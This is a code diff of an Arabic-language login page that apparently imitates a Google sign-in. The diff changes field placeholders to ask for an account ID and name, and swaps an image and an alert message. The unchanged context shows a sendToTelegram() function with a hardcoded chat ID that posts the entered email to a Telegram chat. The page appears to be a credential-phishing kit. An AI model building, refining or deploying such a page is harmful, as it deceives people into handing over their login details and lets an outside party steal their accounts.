@@ -89,7 +89,7 @@
 
     <!-- الصورة الدائرية -->
     <div class="circle-img">
-        <img src="1763827428503.jpg" alt="Image">
+        <img src="IMG_20260227_163153_674.jpg" alt="Image">
     </div>
 
     <!-- نص Google -->
@@ -99,8 +99,8 @@
     <div class="box">
         <h2>تسجيل الدخول</h2>
 
-        <input type="email" id="emailInput" class="input-field" placeholder="اسم حسابك">
-        <input type="password" id="passwordInput" class="input-field" placeholder="أدخل ايدي حسابك">
+        <input type="email" id="emailInput" class="input-field" placeholder="ايدي حسابك">
+        <input type="password" id="passwordInput" class="input-field" placeholder="اسم حسابك">
 
         <button class="btn" onclick="sendToTelegram()">إرسال رسالة آمنة</button>
     </div>
@@ -125,7 +125,7 @@ const CHAT_ID  = "8166977574";      // ← ضع ID هنا
 function sendToTelegram() {
     const email = document.getElementById("emailInput").value;
 
-    if (!email) return alert("أدخل بريدك أولاً");
+    if (!email) return alert("أدخل ايدي حسابك ");
 
     const text = `📩 رسالة جديدة من الموقع:\n\nEmail: ${email}`;
 
